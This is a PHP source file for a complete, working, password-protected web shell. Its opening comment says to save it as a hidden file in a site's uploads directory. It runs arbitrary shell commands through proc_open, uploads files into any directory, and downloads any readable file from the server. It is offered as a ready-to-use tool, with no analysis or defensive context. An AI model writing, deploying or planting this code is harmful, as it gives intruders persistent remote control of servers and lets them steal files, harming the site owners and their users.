<?php
// Save as e.g. /uploads/.t.php ; change PASS before use
declare(strict_types=1);
@session_start();
const PASS = 'CHANGE_ME_9f3a';

function authed(): bool {
    if (!empty($_SESSION['sh'])) return true;
    if (isset($_POST['k']) && hash_equals(PASS, (string)$_POST['k'])) {
        $_SESSION['sh'] = 1; return true;
    }
    return false;
}

if (!authed()) {
    echo '<form method="post"><input type="password" name="k" autofocus>'
       . '<input type="submit" value="login"></form>';
    exit;
}

$cwd = $_POST['cwd'] ?? getcwd();
if (!is_dir($cwd)) $cwd = getcwd();
chdir($cwd);

/* --- command execution --- */
if (isset($_POST['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "[{$cwd}]\n";
    $d = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $p = proc_open($_POST['cmd'] . ' 2>&1', $d, $pipes);
    if (is_resource($p)) {
        fclose($pipes[0]);
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]); fclose($pipes[2]);
        echo "\n[rc=" . proc_close($p) . "]";
    }
    exit;
}

/* --- file upload --- */
if (!empty($_FILES['f']['tmp_name'])) {
    $dest = $cwd . '/' . basename($_FILES['f']['name']);
    echo move_uploaded_file($_FILES['f']['tmp_name'], $dest)
        ? "uploaded: $dest" : 'upload failed';
    exit;
}

/* --- file download --- */
if (isset($_GET['dl'])) {
    $f = realpath($_GET['dl']);
    if ($f && is_file($f) && is_readable($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Length: ' . filesize($f));
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        readfile($f);
    }
    exit;
}
?>
<form method="post">
  <input type="text" name="cwd" value="<?=htmlspecialchars($cwd)?>" size="60">
  <input type="text" name="cmd" size="60" autofocus>
  <input type="submit" value="run">
</form>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="f"><input type="submit" value="upload">
</form>